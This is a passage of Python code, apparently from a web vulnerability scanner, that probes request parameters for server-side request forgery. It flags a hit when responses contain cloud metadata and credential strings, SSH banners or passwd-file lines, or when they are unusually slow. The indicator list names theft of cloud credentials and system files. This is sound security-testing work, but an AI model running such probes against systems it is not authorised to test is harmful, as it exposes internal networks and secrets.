                    async with self.session.get(test_url) as response:
                        response_time = time.time() - start_time
                        response_text = await response.text()
                        
                        # Check for SSRF indicators
                        ssrf_indicators = [
                            'ami-id', 'instance-id', 'security-credentials',  # AWS
                            'computeMetadata', 'service-accounts',  # GCP
                            'Microsoft Azure', 'subscription-id',  # Azure
                            'SSH-2.0', 'OpenSSH',  # SSH services
                            'root:', 'daemon:', 'bin:',  # File access
                            'HTTP/1.1 200 OK', 'Server:',  # HTTP responses
                            'Connection refused', 'Connection timeout'  # Network errors
                        ]
                        
                        for indicator in ssrf_indicators:
                            if indicator in response_text:
                                results['vulnerabilities'].append({
                                    'type': 'Server-Side Request Forgery (SSRF)',
                                    'severity': 'High',
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f'SSRF indicator detected: {indicator}',
                                    'url': test_url,
                                    'description': f'SSRF vulnerability in parameter "{param}"',
                                    'impact': 'Internal network access, cloud metadata exposure, port scanning',
                                    'cwe': 'CWE-918',
                                    'owasp': 'A10:2021 - Server-Side Request Forgery'
                                })
                                break
                        
                        # Check for time-based SSRF (internal network timeouts)
                        if response_time > 10 and 'timeout' not in response_text.lower():
                            results['vulnerabilities'].append({
                                'type': 'Time-based SSRF',
                                'severity': 'Medium',
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'Unusual response time: {response_time:.2f}s',
                                'url': test_url,
                                'description': 'Potential SSRF detected through response timing',
                                'impact': 'Internal network reconnaissance',
                                'cwe': 'CWE-918',
                                'owasp': 'A10:2021 - Server-Side Request Forgery'
                            })
                
                except Exception as e:
                    continue
        
        return results